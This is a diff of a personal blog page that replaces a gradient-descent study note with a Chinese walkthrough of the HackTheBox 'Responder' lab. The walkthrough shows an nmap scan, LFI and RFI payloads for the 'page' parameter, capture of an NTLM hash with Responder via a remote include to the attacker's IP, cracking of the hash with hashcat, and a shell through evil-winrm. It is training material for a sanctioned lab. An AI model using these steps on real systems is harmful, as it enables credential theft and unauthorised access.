@@ -6,20 +6,33 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="http://example.com">
-  <title>李宏毅机器学习笔记：3.Gradient Descent | MiGooli&#39;s Blog</title>
+  <title>HackTheBox_StartingPoint_Tier1_Responder | MiGooli&#39;s Blog</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="关于梯度下降算法的介绍">
+  <meta name="description" content="You need to walk before you can run（目前为止完成时间最长的靶机，主要是扫描和爆破比较费时间） TASK 1    How many TCP ports are open on the machine?靶机中开放的TCP端口数量为：3  nmap -A -p1-65535 10.129.34.77 PS：这里由于校园网WAF的限制，所以7680端口无法直接扫描出来">
 <meta property="og:type" content="article">
-<meta property="og:title" content="李宏毅机器学习笔记：3.Gradient Descent">
-<meta property="og:url" content="http://example.com/2022/04/16/%E6%9D%8E%E5%AE%8F%E6%AF%85%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%9A3.Gradient%20Descent/index.html">
+<meta property="og:title" content="HackTheBox_StartingPoint_Tier1_Responder">
+<meta property="og:url" content="http://example.com/2022/06/05/HackTheBox_StartingPoint_Tier1_Responder/index.html">
 <meta property="og:site_name" content="MiGooli&#39;s Blog">
-<meta property="og:description" content="关于梯度下降算法的介绍">
+<meta property="og:description" content="You need to walk before you can run（目前为止完成时间最长的靶机，主要是扫描和爆破比较费时间） TASK 1    How many TCP ports are open on the machine?靶机中开放的TCP端口数量为：3  nmap -A -p1-65535 10.129.34.77 PS：这里由于校园网WAF的限制，所以7680端口无法直接扫描出来">
 <meta property="og:locale" content="en_US">
-<meta property="article:published_time" content="2022-04-15T16:00:00.000Z">
-<meta property="article:modified_time" content="2022-04-16T14:19:35.273Z">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/a242e065ec08471cb8288e28468585de.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/c147b09f05784842b37913ee57e04b55.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/3f80d68647a1459faf6276949e94a0e4.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/cfbd2e871b1d4d798788b6b48e84601e.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/e1cca0c38acf4b20bba888ff319cb22d.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/1888112d3b5243b8a4a3675f90c308f9.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/45b5bae5d20f4dfcb2a9bf3dca6e20a8.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/b741df59c10c48888dbc10eea1fc6188.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/5d834e406f6144debcdcd82cf9db50f4.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/e21fe1b619074ffdba57baaaeceec76e.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/03881b8e35484121802cc879ea3ff32b.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/5e0f19b6537a477e8a56bf58c81ea0a6.png">
+<meta property="article:published_time" content="2022-06-04T16:00:00.000Z">
+<meta property="article:modified_time" content="2022-06-05T16:45:50.321Z">
 <meta property="article:author" content="John Doe">
-<meta property="article:tag" content="学习笔记">
+<meta property="article:tag" content="HackTheBox">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://img-blog.csdnimg.cn/a242e065ec08471cb8288e28468585de.png">
   
     <link rel="alternative" href="/atom.xml" title="MiGooli&#39;s Blog" type="application/atom+xml">
   
@@ -48,19 +61,19 @@
 <div class="intrude-less">
 	<header id="header" class="inner">
 		<a href="/" class="profilepic">
-			<img src="/assets/bubu.png" class="js-avatar">
+			<img src="/assets/zong.jpg" class="js-avatar">
 		</a>
 		<hgroup>
 		  <h1 class="header-author"><a href="/">MiGooli</a></h1>
 		</hgroup>
 		
-		<p class="header-subtitle">被WEB劝退的Python工程师</p>
+		<p class="header-subtitle">路漫漫其修远兮，吾将上下而求索</p>
 		
 
 		<nav class="header-menu">
 			<ul>
 			
-				<li><a href="/tags/LeetCode">LeetCode</a></li>
+				<li><a href="/tags/HackTheBox">HackTheBox</a></li>
 	        
 				<li><a href="/tags/ctfshow">ctfshow</a></li>
 	        
@@ -110,13 +123,13 @@
 	<div class="intrude-less">
 		<header id="header" class="inner">
 			<div class="profilepic">
-				<img src="/assets/bubu.png" class="js-avatar">
+				<img src="/assets/zong.jpg" class="js-avatar">
 			</div>
 			<hgroup>
 			  <h1 class="header-author js-header-author">MiGooli</h1>
 			</hgroup>
 			
-			<p class="header-subtitle"><i class="icon icon-quo-left"></i>被WEB劝退的Python工程师<i class="icon icon-quo-right"></i></p>
+			<p class="header-subtitle"><i class="icon icon-quo-left"></i>路漫漫其修远兮，吾将上下而求索<i class="icon icon-quo-right"></i></p>
 			
 			
 			
@@ -146,7 +159,7 @@
 				<ul style="width: 70%">
 				
 				
-					<li style="width: 25%"><a href="/tags/LeetCode">LeetCode</a></li>
+					<li style="width: 25%"><a href="/tags/HackTheBox">HackTheBox</a></li>
 		        
 					<li style="width: 25%"><a href="/tags/ctfshow">ctfshow</a></li>
 		        
@@ -167,43 +180,61 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            <article id="post-李宏毅机器学习笔记：3.Gradient Descent" class="article article-type-post " itemscope itemprop="blogPost">
+            <article id="post-HackTheBox_StartingPoint_Tier1_Responder" class="article article-type-post " itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
     <h1 class="article-title" itemprop="name">
-      李宏毅机器学习笔记：3.Gradient Descent
+      HackTheBox_StartingPoint_Tier1_Responder
     </h1>
   
 
         
-        <a href="/2022/04/16/%E6%9D%8E%E5%AE%8F%E6%AF%85%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%9A3.Gradient%20Descent/" class="archive-article-date">
-  	<time datetime="2022-04-15T16:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2022-04-16</time>
+        <a href="/2022/06/05/HackTheBox_StartingPoint_Tier1_Responder/" class="archive-article-date">
+  	<time datetime="2022-06-04T16:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2022-06-05</time>
 </a>
         
       </header>
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p>关于梯度下降算法的介绍</p>
-<span id="more"></span>
-<h1 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h1><p>梯度下降（Gradient Descent）是迭代法的一种,可以用于求解最小二乘问题(线性和非线性都可以)。在求解机器学习算法的模型参数，即无约束优化问题时，梯度下降是最常采用的方法之一。在求解损失函数的最小值时，可以通过梯度下降法来一步步的迭代求解，得到最小化的损失函数和模型参数值。</p>
-<h1 id="求解步骤"><a href="#求解步骤" class="headerlink" title="求解步骤"></a>求解步骤</h1><h2 id="1、初始化参数"><a href="#1、初始化参数" class="headerlink" title="1、初始化参数"></a>1、初始化参数</h2><p>​            随机选取一个w<sup>0</sup>，令w = w<sup>0</sup></p>
-<h2 id="2、计算梯度"><a href="#2、计算梯度" class="headerlink" title="2、计算梯度"></a>2、计算梯度</h2><script type="math/tex; mode=display">
-Gradient = {dL(f)\over dw}\mid_{w=w^0}</script><p>​            若模型有多个参数，如L(w<sub>0</sub>, w<sub>1</sub>)，则计算的时候计算偏导数</p>
-<h2 id="3、更新参数"><a href="#3、更新参数" class="headerlink" title="3、更新参数"></a>3、更新参数</h2><script type="math/tex; mode=display">
-w^1 = w^0 - \eta{dL(f)\over dw}\mid_{w=w^0}\\
-其中\eta为学习率（Learning\ Rate）</script><p>​            同样的，若模型有多个参数，则计算的也是偏导数    </p>
-<h2 id="4、重复2和3"><a href="#4、重复2和3" class="headerlink" title="4、重复2和3"></a>4、重复2和3</h2><p>​            通过不断的迭代，可以求出局部最优解（Local Optimal）</p>
-<h1 id="自适应梯度下降（Adaptive-Gradient-Descent）"><a href="#自适应梯度下降（Adaptive-Gradient-Descent）" class="headerlink" title="自适应梯度下降（Adaptive Gradient Descent）"></a>自适应梯度下降（Adaptive Gradient Descent）</h1><p>​    即<strong>Adagrad</strong>算法，其核心思想是让每个参数都有各自的学习率，从而找出最优解</p>
-<script type="math/tex; mode=display">
-w^{t+1} = w^t-{\eta\over\sqrt{\sum_{i=0}^t(g^i)^2}}g^t</script><h1 id="随机梯度下降（Stochastic-Gradient-Descent）"><a href="#随机梯度下降（Stochastic-Gradient-Descent）" class="headerlink" title="随机梯度下降（Stochastic Gradient Descent）"></a>随机梯度下降（Stochastic Gradient Descent）</h1><p>​    即SGD算法，与Adagrad算法计算完所有样本的Loss后再进行梯度下降的做法不同，SGD算法每次只计算一个样本就进行梯度下降，这样可以加快模型训练的过程</p>
-<h1 id="局限性"><a href="#局限性" class="headerlink" title="局限性"></a>局限性</h1><ol>
-<li>梯度下降过程中，参数更新并不一定会使损失函数的值变小</li>
-<li>梯度下降求解的仅仅是局部最优解，并不是全局最优解，有时候甚至可以得到的是鞍点</li>
-</ol>
+        <p>You need to walk before you can run<br>（目前为止完成时间最长的靶机，主要是扫描和爆破比较费时间）</p>
+<h2 id="TASK-1-How-many-TCP-ports-are-open-on-the-machine"><a href="#TASK-1-How-many-TCP-ports-are-open-on-the-machine" class="headerlink" title="TASK 1    How many TCP ports are open on the machine?"></a>TASK 1    How many TCP ports are open on the machine?</h2><p>靶机中开放的TCP端口数量为：<strong>3</strong></p>
+<blockquote>
+<p>nmap -A -p1-65535 10.129.34.77</p>
+<p>PS：这里由于校园网WAF的限制，所以7680端口无法直接扫描出来</p>
+</blockquote>
+<p><img src="https://img-blog.csdnimg.cn/a242e065ec08471cb8288e28468585de.png" alt="在这里插入图片描述"></p>
+<h2 id="TASK-2-When-visiting-the-web-service-using-the-IP-address-what-is-the-domain-that-we-are-being-redirected-to"><a href="#TASK-2-When-visiting-the-web-service-using-the-IP-address-what-is-the-domain-that-we-are-being-redirected-to" class="headerlink" title="TASK 2    When visiting the web service using the IP address, what is the domain that we are being redirected to?"></a>TASK 2    When visiting the web service using the IP address, what is the domain that we are being redirected to?</h2><p>当直接访问靶机IP时，被重定向到了：<strong>unika.htb</strong></p>
+<p><img src="https://img-blog.csdnimg.cn/c147b09f05784842b37913ee57e04b55.png" alt="在这里插入图片描述"></p>
+<h2 id="TASK-3-Which-scripting-language-is-being-used-on-the-server-to-generate-webpages"><a href="#TASK-3-Which-scripting-language-is-being-used-on-the-server-to-generate-webpages" class="headerlink" title="TASK 3    Which scripting language is being used on the server to generate webpages?"></a>TASK 3    Which scripting language is being used on the server to generate webpages?</h2><p>靶机网页使用的语言是：<strong>PHP</strong></p>
+<p>打开BP抓个包，即可得到答案</p>
+<p><img src="https://img-blog.csdnimg.cn/3f80d68647a1459faf6276949e94a0e4.png" alt="在这里插入图片描述"></p>
+<h2 id="TASK-4-What-is-the-name-of-the-URL-parameter-which-is-used-to-load-different-language-versions-of-the-webpage"><a href="#TASK-4-What-is-the-name-of-the-URL-parameter-which-is-used-to-load-different-language-versions-of-the-webpage" class="headerlink" title="TASK 4    What is the name of the URL parameter which is used to load different language versions of the webpage?"></a>TASK 4    What is the name of the URL parameter which is used to load different language versions of the webpage?</h2><p>用于加载不同语言的URL参数是：<strong>page</strong></p>
+<blockquote>
+<p>首先修改hosts文件禁止页面跳转，编辑/etc/hosts，添加IP地址和跳转地址，之后发现靶机IP可以正常访问</p>
+<p>接着点修改语言（右上角EN），发现URL中的参数<strong>page</strong><br><img src="https://img-blog.csdnimg.cn/cfbd2e871b1d4d798788b6b48e84601e.png" alt="在这里插入图片描述"><img src="https://img-blog.csdnimg.cn/e1cca0c38acf4b20bba888ff319cb22d.png" alt="在这里插入图片描述"><img src="https://img-blog.csdnimg.cn/1888112d3b5243b8a4a3675f90c308f9.png" alt="在这里插入图片描述"></p>
+<h2 id="TASK-5-Which-of-the-following-values-for-the-page-parameter-would-be-an-example-of-exploiting-a-Local-File-Include-LFI-vulnerability-“french-html”-“-10-10-14-6-somefile”-“-windows-system32-drivers-etc-hosts”-“minikatz-exe”"><a href="#TASK-5-Which-of-the-following-values-for-the-page-parameter-would-be-an-example-of-exploiting-a-Local-File-Include-LFI-vulnerability-“french-html”-“-10-10-14-6-somefile”-“-windows-system32-drivers-etc-hosts”-“minikatz-exe”" class="headerlink" title="TASK 5    Which of the following values for the `page` parameter would be an example of exploiting a Local File Include (LFI) vulnerability: “french.html”, “//10.10.14.6/somefile”, “../../../../../../../../windows/system32/drivers/etc/hosts”, “minikatz.exe”"></a>TASK 5    Which of the following values for the `page` parameter would be an example of exploiting a Local File Include (LFI) vulnerability: “french.html”, “//10.10.14.6/somefile”, “../../../../../../../../windows/system32/drivers/etc/hosts”, “minikatz.exe”</h2></blockquote>
+<p>选择题，可以进行本地文件包含的是：<strong>../../../../../../../../windows/system32/drivers/etc/hosts</strong></p>
+<p><img src="https://img-blog.csdnimg.cn/45b5bae5d20f4dfcb2a9bf3dca6e20a8.png" alt="在这里插入图片描述"></p>
+<h2 id="TASK-6-Which-of-the-following-values-for-the-page-parameter-would-be-an-example-of-exploiting-a-Remote-File-Include-RFI-vulnerability-“french-html”-“-10-10-14-6-somefile”-“-windows-system32-drivers-etc-hosts”-“minikatz-exe”"><a href="#TASK-6-Which-of-the-following-values-for-the-page-parameter-would-be-an-example-of-exploiting-a-Remote-File-Include-RFI-vulnerability-“french-html”-“-10-10-14-6-somefile”-“-windows-system32-drivers-etc-hosts”-“minikatz-exe”" class="headerlink" title="TASK 6    Which of the following values for the `page` parameter would be an example of exploiting a Remote File Include (RFI) vulnerability: “french.html”, “//10.10.14.6/somefile”, “../../../../../../../../windows/system32/drivers/etc/hosts”, “minikatz.exe”"></a>TASK 6    Which of the following values for the `page` parameter would be an example of exploiting a Remote File Include (RFI) vulnerability: “french.html”, “//10.10.14.6/somefile”, “../../../../../../../../windows/system32/drivers/etc/hosts”, “minikatz.exe”</h2><p>同选择题，可以进行远程文件包含的是：<strong>//10.10.14.6/somefile</strong></p>
+<h2 id="TASK-7-What-does-NTLM-stand-for"><a href="#TASK-7-What-does-NTLM-stand-for" class="headerlink" title="TASK 7    What does NTLM stand for?"></a>TASK 7    What does NTLM stand for?</h2><p>NTLM的全称是：<strong>New Technology LAN Manager</strong></p>
+<h2 id="TASK-8-Which-flag-do-we-use-in-the-Responder-utility-to-specify-the-network-interface"><a href="#TASK-8-Which-flag-do-we-use-in-the-Responder-utility-to-specify-the-network-interface" class="headerlink" title="TASK 8    Which flag do we use in the Responder utility to specify the network interface?"></a>TASK 8    Which flag do we use in the Responder utility to specify the network interface?</h2><p>responder中能指定网络接口的参数：<strong>-I</strong>（杠艾）</p>
+<h2 id="TASK-9-There-are-several-tools-that-take-a-NetNTLMv2-challenge-response-and-try-millions-of-passwords-to-see-if-any-of-them-generate-the-same-response-One-such-tool-is-often-referred-to-as-john-but-the-full-name-is-what"><a href="#TASK-9-There-are-several-tools-that-take-a-NetNTLMv2-challenge-response-and-try-millions-of-passwords-to-see-if-any-of-them-generate-the-same-response-One-such-tool-is-often-referred-to-as-john-but-the-full-name-is-what" class="headerlink" title="TASK 9    There are several tools that take a NetNTLMv2 challenge/response and try millions of passwords to see if any of them generate the same response. One such tool is often referred to as `john`, but the full name is what?."></a>TASK 9    There are several tools that take a NetNTLMv2 challenge/response and try millions of passwords to see if any of them generate the same response. One such tool is often referred to as `john`, but the full name is what?.</h2><p>john的全称是：<strong>john the ripper</strong>（用来爆破NTLM哈希的工具）</p>
+<h2 id="TASK-10-What-is-the-password-for-the-administrator-user"><a href="#TASK-10-What-is-the-password-for-the-administrator-user" class="headerlink" title="TASK 10    What is the password for the administrator user?"></a>TASK 10    What is the password for the administrator user?</h2><p>管理员账户的密码是：<strong>badminton</strong></p>
+<blockquote>
+<p>1、启动responder监听本地的tun0网卡：<strong>responder -I tun0</strong><br><img src="https://img-blog.csdnimg.cn/b741df59c10c48888dbc10eea1fc6188.png" alt="在这里插入图片描述"></p>
+<p>2、由于靶机存在远程文件包含漏洞，所以利用本机IP进行RFI：<strong>?page=//10.10.16.82/1.txt</strong></p>
+<p><img src="https://img-blog.csdnimg.cn/5d834e406f6144debcdcd82cf9db50f4.png" alt="在这里插入图片描述"></p>
+<p>3、成功RFI后查看responder，得到返回的哈希值<br><img src="https://img-blog.csdnimg.cn/e21fe1b619074ffdba57baaaeceec76e.png" alt="在这里插入图片描述"></p>
+<p>4、利用hashcat进行爆破，得到管理员密码：<strong>hashcat -m 5600 -a 3 responder.txt rockyou.txt</strong></p>
+<p><img src="https://img-blog.csdnimg.cn/03881b8e35484121802cc879ea3ff32b.png" alt="在这里插入图片描述"></p>
+<h2 id="TASK-11-We’ll-use-a-Windows-service-i-e-running-on-the-box-to-remotely-access-the-Responder-machine-using-the-password-we-recovered-What-port-TCP-does-it-listen-on"><a href="#TASK-11-We’ll-use-a-Windows-service-i-e-running-on-the-box-to-remotely-access-the-Responder-machine-using-the-password-we-recovered-What-port-TCP-does-it-listen-on" class="headerlink" title="TASK 11    We’ll use a Windows service (i.e. running on the box) to remotely access the Responder machine using the password we recovered. What port TCP does it listen on?"></a>TASK 11    We’ll use a Windows service (i.e. running on the box) to remotely access the Responder machine using the password we recovered. What port TCP does it listen on?</h2></blockquote>
+<p>使用我们恢复的密码远程访问 Responder的Windows 服务监听的端口是：<strong>5985</strong></p>
+<h2 id="Submit-root-flag"><a href="#Submit-root-flag" class="headerlink" title="Submit root flag"></a>Submit root <em>flag</em></h2><p>利用evil-winrm直接getshell，在mike账户desktop下面找到flag</p>
+<p><img src="https://img-blog.csdnimg.cn/5e0f19b6537a477e8a56bf58c81ea0a6.png" alt="在这里插入图片描述"></p>
 
       
 
@@ -248,7 +279,7 @@ w^{t+1} = w^t-{\eta\over\sqrt{\sum_{i=0}^t(g^i)^2}}g^t</script><h1 id="随机梯
 		<ul class="article-tag-list">
 			 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">学习笔记</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">HackTheBox</a>
         		</li>
       		
 		</ul>
@@ -304,7 +335,7 @@ w^{t+1} = w^t-{\eta\over\sqrt{\sum_{i=0}^t(g^i)^2}}g^t</script><h1 id="随机梯
     <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
     <p>扫一扫，分享到微信</p>
     <div class="wx-qrcode">
-      <img src="//pan.baidu.com/share/qrcode?url=http://example.com/2022/04/16/%E6%9D%8E%E5%AE%8F%E6%AF%85%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%9A3.Gradient%20Descent/" alt="微信分享二维码">
+      <img src="//pan.baidu.com/share/qrcode?url=http://example.com/2022/06/05/HackTheBox_StartingPoint_Tier1_Responder/" alt="微信分享二维码">
     </div>
 </div>
 
@@ -318,18 +349,9 @@ w^{t+1} = w^t-{\eta\over\sqrt{\sum_{i=0}^t(g^i)^2}}g^t</script><h1 id="随机梯
   
 <nav id="article-nav">
   
-    <a href="/2022/04/20/%E6%9D%8E%E5%AE%8F%E6%AF%85%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%9A4.Classification/" id="article-nav-newer" class="article-nav-link-wrap">
-      <i class="icon-circle-left"></i>
-      <div class="article-nav-title">
-        
-          李宏毅机器学习笔记：4.Classiication
-        
-      </div>
-    </a>
   
-  
-    <a href="/2022/04/15/%E6%9D%8E%E5%AE%8F%E6%AF%85%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%9A2.Regression/" id="article-nav-older" class="article-nav-link-wrap">
-      <div class="article-nav-title">李宏毅机器学习笔记：2.Regression</div>
+    <a href="/2022/06/04/HackTheBox_StartingPoint_Tier1_Crocodile/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">HackTheBox_StartingPoint_Tier1_Crocodile</div>
       <i class="icon-circle-right"></i>
     </a>
   
@@ -453,6 +475,10 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
             <input type="checkbox" q-on="click:toggleTag(e)" q-attr="checked:showTags">
           </label>
           <ul class="article-tag-list" q-show="showTags">
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color1">HackTheBox</a>
+              </li>
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color4">LeetCode</a>
